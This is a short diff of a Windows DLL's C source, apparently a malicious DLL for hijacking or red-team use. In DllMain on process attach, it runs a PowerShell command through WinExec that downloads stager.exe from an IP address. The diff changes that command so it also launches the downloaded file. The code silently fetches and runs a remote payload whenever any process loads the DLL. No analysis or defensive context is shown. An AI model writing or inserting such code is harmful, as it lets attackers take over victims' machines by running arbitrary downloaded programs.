@@ -780,7 +780,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 	switch (fdwReason)
 	{
 		case DLL_PROCESS_ATTACH:
-		    WinExec("powershell -c wget http://10.200.75.73/stager.exe -o C:\\Temp\\stager.exe", SW_SHOW);
+		    WinExec("powershell -c wget http://10.200.75.73/stager.exe -o C:\\Temp\\stager.exe && Start-Process C:\\Temp\\stager.exe", SW_SHOW);
 		    break;
 	}
 		
